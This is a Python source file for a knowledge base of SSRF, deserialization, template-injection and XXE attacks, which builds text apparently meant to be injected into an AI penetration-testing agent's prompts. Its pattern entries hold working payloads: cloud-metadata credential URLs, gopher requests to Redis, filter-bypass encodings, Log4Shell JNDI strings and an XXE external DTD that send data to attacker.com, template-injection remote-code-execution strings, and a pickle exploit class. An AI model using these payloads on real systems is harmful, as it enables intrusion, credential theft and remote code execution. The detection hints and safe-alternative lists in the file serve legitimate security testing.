"""SSRF and deserialization vulnerability knowledge base.

Deep knowledge about:
1. Server-Side Request Forgery (SSRF) patterns
2. Insecure deserialization attacks
3. XXE (XML External Entity) patterns
4. Template injection (SSTI)
5. Object injection across languages
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class InjectionPattern:
    """An injection/SSRF/deserialization pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    payloads: list[str] = field(default_factory=list)
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:15],
        }


INJECTION_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "ssrf-001", "name": "Server-Side Request Forgery (SSRF)",
        "category": "ssrf", "severity": "critical",
        "desc": "Making the server send requests to internal resources.",
        "detection": (
            "SSRF DETECTION AND EXPLOITATION:\n"
            "COMMON INJECTION POINTS:\n"
            "  - URL parameters: ?url=, ?link=, ?redirect=, ?path=, ?src=\n"
            "  - File fetching: PDF generators, image processors, URL previews\n"
            "  - Webhook/callback URLs\n"
            "  - Import/export functionality (CSV, XML, JSON with URLs)\n"
            "  - API proxy endpoints\n"
            "PAYLOADS:\n"
            "  Basic: http://127.0.0.1, http://localhost\n"
            "  Cloud metadata:\n"
            "    AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "    GCP: http://metadata.google.internal/computeMetadata/v1/\n"
            "    Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
            "  Internal services:\n"
            "    Redis: gopher://127.0.0.1:6379/_SET%20key%20value\n"
            "    Memcached: gopher://127.0.0.1:11211/_stats\n"
            "  DNS rebinding: Use rebind.network or your own DNS\n"
            "FILTER BYPASS:\n"
            "  - IP encoding: 0x7f000001, 2130706433, 017700000001\n"
            "  - IPv6: http://[::1], http://[0:0:0:0:0:ffff:127.0.0.1]\n"
            "  - DNS rebinding: Register domain that alternates between external and 127.0.0.1\n"
            "  - URL fragments: http://evil.com#@127.0.0.1\n"
            "  - Double encoding: %252f = /\n"
            "  - Protocol switching: file://, dict://, gopher://, tftp://\n"
            "BLIND SSRF:\n"
            "  - Use OOB interaction: Burp Collaborator, interactsh\n"
            "  - Time-based: Internal vs external response time difference\n"
            "  - Error-based: Different errors for existing vs non-existing hosts"
        ),
        "payloads": [
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "gopher://127.0.0.1:6379/",
        ],
        "tools": ["nuclei", "ffuf", "curl"],
    },
    {
        "id": "deser-001", "name": "Java Deserialization",
        "category": "deserialization", "severity": "critical",
        "desc": "Java object deserialization leading to RCE.",
        "detection": (
            "JAVA DESERIALIZATION:\n"
            "INDICATORS:\n"
            "  - Content-Type: application/x-java-serialized-object\n"
            "  - Magic bytes: ac ed 00 05 (base64: rO0ABQ)\n"
            "  - Java endpoints: RMI (1099), JMX, JNDI\n"
            "  - Frameworks: Apache Struts, Spring, JBoss, WebLogic\n"
            "EXPLOITATION:\n"
            "  - ysoserial: Generate gadget chain payloads\n"
            "    java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin\n"
            "  - Common gadget chains:\n"
            "    CommonsCollections1-7 (Apache Commons)\n"
            "    Spring1-4 (Spring Framework)\n"
            "    Groovy1 (Groovy)\n"
            "    JRMPClient (RMI outbound)\n"
            "JNDI INJECTION (Log4Shell-style):\n"
            "  - ${jndi:ldap://attacker.com/exploit}\n"
            "  - ${jndi:rmi://attacker.com/exploit}\n"
            "  - Obfuscation: ${${lower:j}ndi:ldap://...}\n"
            "DETECTION:\n"
            "  - Scan for serialized object endpoints\n"
            "  - Check library versions (Commons Collections, Log4j)\n"
            "  - nuclei -t java/ -target <url>\n"
            "  - Test with benign deserialization payload (DNS callback)"
        ),
        "payloads": ["rO0ABQ==", "${jndi:ldap://CALLBACK/a}"],
        "tools": ["ysoserial", "nuclei", "curl"],
    },
    {
        "id": "ssti-001", "name": "Server-Side Template Injection (SSTI)",
        "category": "ssti", "severity": "critical",
        "desc": "Injecting into server-side template engines for RCE.",
        "detection": (
            "SSTI DETECTION:\n"
            "DETECTION PAYLOADS:\n"
            "  Universal probe: {{7*7}} → 49 (Jinja2, Twig)\n"
            "  ${7*7} → 49 (Freemarker, Velocity, Thymeleaf)\n"
            "  #{7*7} → 49 (Ruby ERB, Pebble)\n"
            "  {{7*'7'}} → 7777777 (Jinja2 vs Twig)\n"
            "TEMPLATE ENGINE IDENTIFICATION:\n"
            "  Jinja2 (Python): {{config}}, {{request.application.__globals__}}\n"
            "  Twig (PHP): {{_self.env.getFilter('id')}}\n"
            "  Freemarker (Java): ${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n"
            "  Velocity (Java): #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))\n"
            "  Thymeleaf (Java): [[${T(java.lang.Runtime).getRuntime().exec('id')}]]\n"
            "  ERB (Ruby): <%= system('id') %>\n"
            "  Pebble (Java): {% set cmd = 'id' %}{{cmd.getClass().forName('java.lang.Runtime')}}\n"
            "EXPLOITATION (Jinja2 RCE):\n"
            "  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
            "  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n"
            "TESTING APPROACH:\n"
            "  1. Inject {{7*7}} in all input fields\n"
            "  2. Check response for '49'\n"
            "  3. Identify template engine from error messages\n"
            "  4. Use engine-specific RCE payload\n"
            "  5. Verify with OOB callback"
        ),
        "payloads": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
        "tools": ["tplmap", "nuclei", "dalfox"],
    },
    {
        "id": "xxe-001", "name": "XML External Entity (XXE)",
        "category": "xxe", "severity": "critical",
        "desc": "XML parser exploitation for file read, SSRF, and DoS.",
        "detection": (
            "XXE ATTACKS:\n"
            "BASIC FILE READ:\n"
            "  <?xml version=\"1.0\"?>\n"
            "  <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
            "  <root>&xxe;</root>\n"
            "BLIND XXE (OOB):\n"
            "  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;]>\n"
            "  External DTD (xxe.dtd):\n"
            "  <!ENTITY % data SYSTEM \"file:///etc/passwd\">\n"
            "  <!ENTITY % param \"<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>\">\n"
            "  %param;\n"
            "SSRF VIA XXE:\n"
            "  <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/\">]>\n"
            "DOS (BILLION LAUGHS):\n"
            "  <!DOCTYPE lolz [\n"
            "  <!ENTITY lol \"lol\">\n"
            "  <!ENTITY lol2 \"&lol;&lol;&lol;...\">\n"
            "  ... (nested 10 levels)>\n"
            "DETECTION:\n"
            "  - Look for XML input (Content-Type: text/xml, application/xml)\n"
            "  - SOAP endpoints\n"
            "  - File upload accepting XML/XLSX/DOCX/SVG\n"
            "  - SVG image upload\n"
            "  - RSS/Atom feed processors\n"
            "BYPASS:\n"
            "  - CDATA sections for special characters\n"
            "  - UTF-16 encoding\n"
            "  - XInclude: <xi:include href=\"file:///etc/passwd\"/>"
        ),
        "payloads": [
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        ],
        "tools": ["nuclei", "curl", "xxeinjector"],
    },
    {
        "id": "deser-002", "name": "Python Pickle Deserialization",
        "category": "deserialization", "severity": "critical",
        "desc": "Python pickle deserialization leading to RCE.",
        "detection": (
            "PYTHON PICKLE DESERIALIZATION:\n"
            "INDICATORS:\n"
            "  - pickle.loads() or pickle.load() with user input\n"
            "  - Content containing: \\x80\\x05 (pickle protocol 5)\n"
            "  - base64-encoded pickle in cookies, parameters, or API\n"
            "  - yaml.load() (uses pickle internally without safe_load)\n"
            "  - shelve module with user-controlled data\n"
            "EXPLOITATION:\n"
            "  import pickle, os\n"
            "  class Exploit:\n"
            "      def __reduce__(self):\n"
            "          return (os.system, ('id',))\n"
            "  payload = pickle.dumps(Exploit())\n"
            "DETECTION:\n"
            "  - grep -rn 'pickle\\.load\\|pickle\\.loads\\|yaml\\.load' <source>\n"
            "  - Check for pickled data in session cookies\n"
            "  - Check for ML model loading (joblib.load, torch.load)\n"
            "  - NumPy: np.load(allow_pickle=True)\n"
            "SAFE ALTERNATIVES:\n"
            "  - json.loads() for structured data\n"
            "  - yaml.safe_load() for YAML\n"
            "  - restrictedpickle for controlled unpickling\n"
            "  - safetensors for ML model weights"
        ),
        "payloads": [],
        "tools": ["semgrep", "bandit"],
    },
]


class SSRFDeserializationKB:
    """SSRF and deserialization knowledge base.

    Provides SSRF, XXE, SSTI, and deserialization
    patterns injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, InjectionPattern] = {}
        self._log = logger.bind(component="ssrf_deser_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load injection patterns."""
        for data in INJECTION_PATTERNS:
            pattern = InjectionPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                payloads=data.get("payloads", []),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[InjectionPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_injection_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build injection/SSRF/deserialization prompt."""
        lines = ["## SSRF, Deserialization & Injection Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.severity.upper()}]")
            lines.append(pattern.detection_strategy)
            if pattern.payloads:
                lines.append("Key payloads:")
                for payload in pattern.payloads[:3]:
                    lines.append(f"  {payload}")
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
